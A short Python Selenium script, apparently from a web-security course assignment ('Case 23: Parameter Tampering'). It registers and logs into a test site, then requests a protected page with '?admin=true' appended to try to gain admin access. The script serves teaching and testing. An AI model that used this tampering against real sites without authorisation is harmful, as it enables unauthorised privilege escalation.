import time
from selenium import webdriver

# Case 23: HTTP Requests (Parameter Tampering)

username = "yoda"
password = "Maythe4"
email = "star@wars.com"

base_url = 'http://www.wsb.com/Assignment2/case23/'

driver = webdriver.Firefox()

# Register new account
register_url = base_url + 'register.php'
driver.get(register_url)
time.sleep(2)

register_username = driver.find_element_by_id('username')
register_email = driver.find_element_by_id('email')
register_password = driver.find_element_by_id('password')
register_confirmpwd = driver.find_element_by_id('confirmpwd')

register_username.send_keys(username)
register_email.send_keys(email)
register_password.send_keys(password)
register_confirmpwd.send_keys(password)

register_attempt = driver.find_element_by_xpath("//*[@type='button']")
register_attempt.click()
time.sleep(5)

# Login to the account
login_url = base_url + 'login.php'
driver.get(login_url)
time.sleep(2)

login_email = driver.find_element_by_name('email')
login_password = driver.find_element_by_id('password')

login_email.send_keys(email)
login_password.send_keys(password)

login_attempt = driver.find_element_by_xpath("//*[@type='button']")
login_attempt.click()
time.sleep(5)

# Access protected page
protected_url = base_url + 'protected_page.php'
protected_url_with_tampered_parameter = protected_url + "?admin=true"
driver.get(protected_url_with_tampered_parameter)
